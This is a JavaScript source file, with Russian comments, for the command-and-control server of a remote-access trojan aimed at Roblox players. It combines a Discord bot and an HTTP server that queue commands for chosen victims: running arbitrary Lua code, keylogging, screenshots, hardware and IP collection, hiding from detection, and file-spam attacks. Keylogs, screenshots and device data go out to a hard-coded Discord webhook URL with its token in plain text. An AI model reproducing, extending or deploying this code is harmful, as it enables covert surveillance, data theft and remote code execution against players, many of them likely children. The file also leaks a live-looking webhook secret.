const http = require('http');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
const PORT = process.env.PORT || 10000;

// Логирование конфигурации
console.log('🔧 Конфигурация сервера v3.0:');
console.log(`- PORT: ${PORT}`);
console.log(`- SERVER_URL: ${SERVER_URL}`);
console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ Отсутствует'}`);

// ========== ХРАНИЛИЩЕ ДАННЫХ ==========
let commandQueue = [];
let lastScreenshot = null;
global.onlineUsers = new Map();

// ========== DISCORD БОТ ==========
let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    // Функция отправки команды на сервер с таргетингом
    async function sendCommand(command, args = [], target = null) {
        try {
            const payload = {
                command: command,
                args: args
            };
            
            if (target) {
                payload.target = target;
            }
            
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            console.log(`📨 Команда ${command} отправлена для ${target || 'всех игроков'}`);
            return response.ok;
        } catch (error) {
            console.error(`❌ Ошибка отправки команды ${command}:`, error.message);
            return false;
        }
    }

    // Получение списка онлайн пользователей
    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) {
                return await response.json();
            }
            return { users: [], count: 0 };
        } catch (error) {
            console.error('❌ Ошибка получения пользователей:', error.message);
            return { users: [], count: 0 };
        }
    }

    // Получение статуса сервера
    async function getServerStatus() {
        try {
            const response = await fetch(`${SERVER_URL}/status`);
            if (response.ok) {
                return await response.json();
            }
            return null;
        } catch (error) {
            console.error('❌ Ошибка получения статуса:', error.message);
            return null;
        }
    }

    // Функция для парсинга команды с таргетом
    function parseCommandWithTarget(message) {
        const args = message.content.slice(1).split(' ');
        const command = args.shift().toLowerCase();
        
        // Список команд, которые НЕ принимают таргет как первый аргумент
        const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
        
        if (noTargetCommands.includes(command) || args.length === 0) {
            return { command, args, target: null };
        }
        
        // Проверяем первый аргумент - если это число, то это не ник
        const firstArg = args[0];
        const isNumber = !isNaN(parseInt(firstArg));
        const isSpecialArg = firstArg.match(/^[0-9]+$/) || firstArg.startsWith('-');
        
        if (!isNumber && !isSpecialArg) {
            // Первый аргумент - вероятно ник
            const target = args.shift();
            return { command, args, target };
        }
        
        return { command, args, target: null };
    }

    // Функция для создания embed с учетом таргета
    function createEmbed(title, description, color, target = null) {
        const embed = new EmbedBuilder()
            .setTitle(title)
            .setColor(color);
        
        if (target) {
            embed.setDescription(`**🎯 Цель:** \`${target}\`\n${description}`);
        } else {
            embed.setDescription(description);
        }
        
        return embed;
    }

    // Обработчик событий Discord бота
    discordClient.on('ready', () => {
        console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
        console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
        console.log(`🎯 Версия: 3.0 (все команды + таргетинг)`);
        
        discordClient.user.setActivity('RAT Control Panel v3.0', { type: 'WATCHING' });
    });

    // ========== ВСЕ КОМАНДЫ ==========
    discordClient.on('messageCreate', async message => {
        if (message.author.bot) return;
        
        if (message.content.startsWith('/')) {
            const { command, args, target } = parseCommandWithTarget(message);
            
            // Словарь всех команд
            const commandHandlers = {
                // 🧪 ОСНОВНЫЕ
                test: async () => {
                    const text = "Тестовая команда от Discord бота! ✅";
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed(
                            '🧪 Тестовая команда',
                            'Сообщение отправлено',
                            0x00ff00,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                print: async () => {
                    if (await sendCommand("print", [], target)) {
                        const embed = createEmbed(
                            '📡 Проверка связи',
                            'Команда проверки связи отправлена',
                            0x00ff00,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                // 👤 УПРАВЛЕНИЕ ИГРОКОМ
                kick: async () => {
                    const reason = args.join(' ') || 'Нарушение правил';
                    if (await sendCommand("kick", [reason], target)) {
                        const embed = createEmbed(
                            '🦶 Кик',
                            `**Причина:** ${reason}`,
                            0xe74c3c,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                freeze: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 60);
                    
                    if (await sendCommand("freeze", [seconds], target)) {
                        const embed = createEmbed(
                            '❄️ Заморозка',
                            `**Длительность:** \`${seconds}\` секунд`,
                            0x3498db,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                void: async () => {
                    if (await sendCommand("void", [], target)) {
                        const embed = createEmbed(
                            '🌀 Телепорт в бездну',
                            'Игрок телепортирован в бездну',
                            0x2c3e50,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                spin: async () => {
                    if (await sendCommand("spin", [], target)) {
                        const embed = createEmbed(
                            '🔄 Вращение',
                            'Игрок начинает вращаться',
                            0xf39c12,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                fling: async () => {
                    if (await sendCommand("fling", [], target)) {
                        const embed = createEmbed(
                            '🚀 Подбрасывание',
                            'Игрок подброшен в воздух',
                            0xe67e22,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                sit: async () => {
                    if (await sendCommand("sit", [], target)) {
                        const embed = createEmbed(
                            '🪑 Изменение позы',
                            'Игрок меняет позу (сидит/встает)',
                            0x27ae60,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                dance: async () => {
                    if (await sendCommand("dance", [], target)) {
                        const embed = createEmbed(
                            '💃 Танец',
                            'Игрок начинает танцевать',
                            0xe91e63,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                // 🔊 АУДИО/ВИДЕО
                mute: async () => {
                    if (await sendCommand("mute", [], target)) {
                        const embed = createEmbed(
                            '🔇 Звуки отключены',
                            'Все звуки в игре выключены',
                            0x95a5a6,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                unmute: async () => {
                    if (await sendCommand("unmute", [], target)) {
                        const embed = createEmbed(
                            '🔊 Звуки включены',
                            'Все звуки в игре включены',
                            0x2ecc71,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                playaudio: async () => {
                    const audioId = args[0] || "184702873"; // Дефолтный звук
                    if (await sendCommand("playaudio", [audioId], target)) {
                        const embed = createEmbed(
                            '🔊 Воспроизведение аудио',
                            `**ID аудио:** \`${audioId}\``,
                            0x9b59b6,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                blur: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 30);
                    
                    if (await sendCommand("blur", [seconds], target)) {
                        const embed = createEmbed(
                            '🔵 Размытие экрана',
                            `**Длительность:** \`${seconds}\` секунд`,
                            0x3498db,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                // 💬 ЧАТ
                chat: async () => {
                    if (await sendCommand("chat", [], target)) {
                        const embed = createEmbed(
                            '💬 Управление чатом',
                            'Чат активирован/деактивирован',
                            0x9b59b6,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                message: async () => {
                    const text = args.join(' ');
                    if (!text) {
                        await message.reply('❌ Укажите текст сообщения');
                        return;
                    }
                    
                    if (text.length > 100) {
                        await message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
                        return;
                    }
                    
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed(
                            '📩 Сообщение отправлено',
                            `**Текст:** \`\`\`${text}\`\`\``,
                            0x3498db,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                // 👻 СКРИМЕРЫ
                jumpscare: async () => {
                    let scareType = parseInt(args[0]) || 1;
                    const scareNames = { 
                        1: "Джефф Килер 👹", 
                        2: "Соник.exe 💀" 
                    };
                    const name = scareNames[scareType] || scareNames[1];
                    
                    if (await sendCommand("jumpscare", [scareType], target)) {
                        const embed = createEmbed(
                            `👻 Скример ${name}`,
                            '**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n**Длительность:** ~10 секунд',
                            0xff0000,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                // ⚙️ СИСТЕМНЫЕ
                execute: async () => {
                    const code = args.join(' ');
                    if (!code) {
                        await message.reply('❌ Укажите код для выполнения');
                        return;
                    }
                    
                    if (code.length > 500) {
                        await message.reply('❌ Код слишком длинный (макс. 500 символов)');
                        return;
                    }
                    
                    if (await sendCommand("execute", [code], target)) {
                        const embed = createEmbed(
                            '🔧 Код отправлен',
                            `\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``,
                            0xf39c12,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                fakeerror: async () => {
                    const errorText = args.join(' ') || 'Системная ошибка';
                    const displayText = errorText.length > 80 ? errorText.substring(0, 77) + '...' : errorText;
                    
                    if (await sendCommand("fakeerror", [displayText], target)) {
                        const embed = createEmbed(
                            '⚠ Фейковая ошибка',
                            `**Сообщение:** \`${displayText}\``,
                            0xe74c3c,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                keylog: async () => {
                    if (await sendCommand("keylog", [], target)) {
                        const embed = createEmbed(
                            '⌨️ Кейлоггер',
                            'Кейлоггер активирован. Логи будут отправляться каждые 5 минут.',
                            0xe74c3c,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                stopkeylog: async () => {
                    if (await sendCommand("stopkeylog", [], target)) {
                        const embed = createEmbed(
                            '🛑 Кейлоггер',
                            'Кейлоггер деактивирован. Последние логи отправлены.',
                            0x2ecc71,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                hardware: async () => {
                    if (await sendCommand("hardware", [], target)) {
                        const embed = createEmbed(
                            '🖥️ Оборудование',
                            'Данные об оборудовании запрошены',
                            0x00ff00,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                hide: async () => {
                    if (await sendCommand("hide", [], target)) {
                        const embed = createEmbed(
                            '👻 Скрытие скрипта',
                            'Скрипт успешно скрыт от систем обнаружения',
                            0x00ff00,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                // 💥 SPAM
                memory: async () => {
                    let fileCount = parseInt(args[0]) || 100;
                    fileCount = Math.min(fileCount, 1000);
                    
                    if (await sendCommand("memory_spam", [fileCount], target)) {
                        const embed = createEmbed(
                            '💾 Memory Spam',
                            `**Количество файлов:** \`${fileCount}\``,
                            0xff6b6b,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                gallery: async () => {
                    let imageCount = parseInt(args[0]) || 10;
                    imageCount = Math.min(imageCount, 50);
                    
                    if (await sendCommand("gallery_spam", [imageCount], target)) {
                        const embed = createEmbed(
                            '🖼️ Gallery Spam',
                            `**Количество файлов:** \`${imageCount}\`\n**Источник:** GitHub`,
                            0x74b9ff,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                screenshot: async () => {
                    if (await sendCommand("screenshot", [], target)) {
                        const embed = createEmbed(
                            '🖥️ Скриншот',
                            'Скриншот запрошен. Результат будет через 5 секунд.',
                            0x3498db,
                            target
                        );
                        await message.reply({ embeds: [embed] });
                        
                        // Ждем и пытаемся получить скриншот
                        setTimeout(async () => {
                            try {
                                const response = await fetch(`${SERVER_URL}/screenshot`);
                                if (response.ok) {
                                    const data = await response.json();
                                    if (data.image) {
                                        await message.reply('📸 Скриншот получен (база64)');
                                    }
                                }
                            } catch (e) {
                                console.error('Ошибка получения скриншота:', e);
                            }
                        }, 5000);
                    }
                },
                
                // 👥 ПОЛЬЗОВАТЕЛИ
                users: async () => {
                    const data = await getOnlineUsers();
                    
                    if (data.count === 0) {
                        const embed = new EmbedBuilder()
                            .setTitle('👥 Онлайн пользователи')
                            .setDescription('❌ Нет активных пользователей')
                            .setColor(0xff0000);
                        await message.reply({ embeds: [embed] });
                        return;
                    }
                    
                    const embed = new EmbedBuilder()
                        .setTitle('👥 Онлайн пользователи')
                        .setDescription(`**Всего пользователей:** ${data.count}`)
                        .setColor(0x00ff00)
                        .setTimestamp();
                    
                    const games = {};
                    data.users.forEach(user => {
                        const game = user.place || 'Unknown';
                        if (!games[game]) games[game] = [];
                        games[game].push(user);
                    });
                    
                    for (const [game, users] of Object.entries(games)) {
                        const userList = users.slice(0, 5).map(u => 
                            `\`${u.player}\` (${u.executor || 'Unknown'})`
                        ).join('\n');
                        
                        embed.addFields({
                            name: `🎮 ${game} (${users.length})`,
                            value: userList + (users.length > 5 ? `\n... и еще ${users.length - 5}` : ''),
                            inline: false
                        });
                    }
                    
                    await message.reply({ embeds: [embed] });
                },
                
                status: async () => {
                    const data = await getServerStatus();
                    
                    if (data) {
                        const embed = new EmbedBuilder()
                            .setTitle('📊 Статус системы')
                            .setDescription('Текущее состояние RAT Control System')
                            .setColor(0x7289da)
                            .addFields(
                                { name: '🤖 Бот', value: '🟢 Активен', inline: true },
                                { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
                                { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
                                { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.0.0\`\n• Сервер: \`${SERVER_URL}\`\n• Обновление: \`15 секунд\``, inline: false }
                            )
                            .setTimestamp();
                        
                        await message.reply({ embeds: [embed] });
                    } else {
                        await message.reply('❌ Ошибка получения статуса');
                    }
                },
                
                // 📜 ПОМОЩЬ
                help: async () => {
                    const helpEmbed = new EmbedBuilder()
                        .setTitle('🤖 RAT Control Panel v3.0')
                        .setDescription('Полный список всех команд с поддержкой таргетинга')
                        .setColor(0x7289da)
                        .addFields(
                            { 
                                name: '🎯 Формат команд:', 
                                value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами', 
                                inline: false 
                            },
                            { 
                                name: '👤 Управление игроком', 
                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '🔊 Аудио/Видео', 
                                value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '💬 Чат', 
                                value: '`/chat [ник]`\n`/message [ник] <текст>`', 
                                inline: false 
                            },
                            { 
                                name: '👻 Скримеры', 
                                value: '`/jumpscare [ник] <тип>`\n1-Джефф Килер, 2-Соник.exe', 
                                inline: false 
                            },
                            { 
                                name: '⚙️ Системные', 
                                value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '💥 Spam', 
                                value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
                                inline: false 
                            },
                            { 
                                name: '👥 Информация', 
                                value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
                                inline: false 
                            }
                        )
                        .setFooter({ text: `Всего команд: 25 | Сервер: ${SERVER_URL}` });
                    
                    await message.reply({ embeds: [helpEmbed] });
                }
            };
            
            // Выполняем команду если она существует
            if (commandHandlers[command]) {
                try {
                    await commandHandlers[command]();
                } catch (error) {
                    console.error(`❌ Ошибка выполнения команды ${command}:`, error);
                    await message.reply(`❌ Ошибка выполнения команды: ${error.message}`);
                }
            } else if (command) {
                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        }
    });

    // Запуск Discord бота
    discordClient.login(DISCORD_TOKEN).then(() => {
        console.log('✅ Discord бот успешно авторизован');
    }).catch(error => {
        console.error('❌ Ошибка авторизации Discord бота:', error.message);
    });
} else {
    console.log('⚠️ DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
}

// ========== СЕРВЕРНАЯ ЛОГИКА ==========
function cleanupInactiveUsers() {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 60 * 1000) {
            global.onlineUsers.delete(key);
        }
    }
}

setInterval(cleanupInactiveUsers, 30 * 1000);

async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: "RAT Control System v3.0" }
                }]
            })
        });
    } catch (error) {
        console.error('Discord webhook error:', error.message);
    }
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // Получение команд для клиента
    if (req.method === 'GET' && req.url.startsWith('/data')) {
        try {
            const url = new URL(req.url, `http://${req.headers.host}`);
            const player = url.searchParams.get('player');
            
            // Ищем команды для этого игрока или для всех
            const commandsForPlayer = [];
            const remainingCommands = [];
            
            for (const cmd of commandQueue) {
                if (cmd.target === null || cmd.target === player || cmd.target === 'all') {
                    commandsForPlayer.push(cmd);
                } else {
                    remainingCommands.push(cmd);
                }
            }
            
            commandQueue = remainingCommands;
            
            if (commandsForPlayer.length > 0) {
                const cmd = commandsForPlayer[0];
                res.end(JSON.stringify({
                    command: cmd.command,
                    args: cmd.args
                }));
            } else {
                res.end(JSON.stringify({
                    command: "",
                    args: []
                }));
            }
        } catch (e) {
            res.statusCode = 400;
            res.end(JSON.stringify({ error: e.message }));
        }
        return;
    }
    
    // Отправка команды от бота
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { command, args, target } = JSON.parse(body);
                
                commandQueue.push({
                    command: command,
                    args: args || [],
                    target: target || null,
                    timestamp: Date.now()
                });
                
                // Логируем инжект уведомления
                if (command === "inject_notify") {
                    const [playerName, gameName, ipInfo, executor, device] = args;
                    
                    let description = `**Игрок:** ${playerName}\n`;
                    description += `**Игра:** ${gameName}\n`;
                    description += `**Инжектор:** ${executor}\n`;
                    description += `**Устройство:** ${device}\n\n`;
                    description += `**IP информация**\n${ipInfo}`;
                    
                    await sendDiscordMessage(
                        "🔌 Новый инжект!",
                        description,
                        0x00ff00
                    );
                }
                
                // Логирование спама
                if (command === "spam_completed") {
                    await sendDiscordMessage(
                        "📁 Спам завершен",
                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
                        0xf39c12
                    );
                }
                
                // Логирование чата
                if (command === "user_chat") {
                    await sendDiscordMessage(
                        "💬 Чат игрока",
                        `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`,
                        0x3498db
                    );
                }
                
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Получение списка онлайн пользователей
    if (req.method === 'GET' && req.url === '/users') {
        cleanupInactiveUsers();
        const users = Array.from(global.onlineUsers.values());
        res.end(JSON.stringify({
            users: users,
            count: users.length
        }));
        return;
    }
    
    // Обновление информации о пользователе
    if (req.method === 'POST' && req.url === '/users') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { player, place, executor, device } = JSON.parse(body);
                global.onlineUsers.set(player, {
                    player: player,
                    place: place,
                    executor: executor,
                    device: device || "Unknown",
                    lastSeen: Date.now()
                });
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Скриншоты
    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    if (req.method === 'GET' && req.url === '/screenshot') {
        res.end(JSON.stringify({ 
            image: lastScreenshot || null 
        }));
        return;
    }
    
    // Кейлоггер
    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                await sendDiscordMessage(
                    "⌨️ Кейлоггер",
                    `\`\`\`${logs.slice(0, 1900)}\`\`\``,
                    0xe74c3c
                );
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Получение информации о железе
    if (req.method === 'POST' && req.url === '/hardware') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { player, data } = JSON.parse(body);
                await sendDiscordMessage(
                    "💻 Информация о системе",
                    `**Игрок:** ${player}\n**Игра:** ${data.game}\n**FPS:** ${data.fps}\n**Пинг:** ${data.ping}\n**Экзекутор:** ${data.executor}\n**Устройство:** ${data.device_type}\n**IP Инфо:** ${data.ip_info}`,
                    0x9b59b6,
                    [
                        {
                            name: "Системная информация",
                            value: `Touch: ${data.system.touch_enabled}\nMouse: ${data.system.mouse_enabled}\nKeyboard: ${data.system.keyboard_enabled}\nScreen: ${data.system.screen_size.X}x${data.system.screen_size.Y}`,
                            inline: true
                        }
                    ]
                );
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Статус сервера
    if (req.method === 'GET' && req.url === '/status') {
        cleanupInactiveUsers();
        res.end(JSON.stringify({
            status: "online",
            version: "3.0.0",
            online_users: global.onlineUsers.size,
            pending_commands: commandQueue.length,
            discord_bot: discordClient && discordClient.user ? {
                username: discordClient.user.tag,
                status: "online",
                commands_count: 25,
                targeted_commands: true
            } : { status: "disabled" }
        }));
        return;
    }
    
    // Информация о системе
    if (req.method === 'GET' && req.url === '/system_info') {
        res.end(JSON.stringify({
            name: "RAT Control System",
            version: "3.0.0",
            description: "Продвинутая система удаленного управления Roblox клиентами",
            server: SERVER_URL,
            features: [
                "Управление игроком (кик, заморозка, телепорт)",
                "Скример система (Джефф Килер, Соник.exe)",
                "Чат система с сообщениями",
                "Мониторинг устройств",
                "Кейлоггер",
                "Spam инструменты",
                "Таргетированные команды"
            ],
            discord_bot: discordClient && discordClient.user ? {
                username: discordClient.user.tag,
                status: "online",
                commands_count: 25,
                targeted_commands: true
            } : { status: "disabled_no_token" }
        }));
        return;
    }
    
    // Корневой путь
    if (req.method === 'GET' && req.url === '/') {
        res.end(JSON.stringify({
            message: "RAT Control System v3.0",
            endpoints: [
                "/data?player=NAME - Получение команд",
                "/users - Онлайн пользователи",
                "/status - Статус системы",
                "/system_info - Информация о проекте"
            ],
            documentation: "Используйте /help в Discord для управления"
        }));
        return;
    }
    
    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found", path: req.url }));
});

// Запуск HTTP сервера
server.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log('📡 Эндпоинты:');
    console.log('• GET  /data?player=NAME - Получение команд для клиента');
    console.log('• POST /command - Отправка команд от бота');
    console.log('• GET  /users - Список онлайн пользователей');
    console.log('• GET  /status - Статус сервера');
    console.log('• GET  /system_info - Информация о системе');
    console.log('');
    
    if (DISCORD_TOKEN) {
        console.log('💬 Discord команды готовы:');
        console.log('• /help - Список всех команд (25 команд)');
        console.log('• /users - Онлайн пользователи');
        console.log('• /jumpscare [ник] [тип] - Скримеры');
        console.log('• /kick [ник] <причина> - Кикнуть');
        console.log('• /freeze [ник] <секунды> - Заморозить');
        console.log('🎯 Формат: /команда [ник] [аргументы]');
    } else {
        console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN');
    }
});
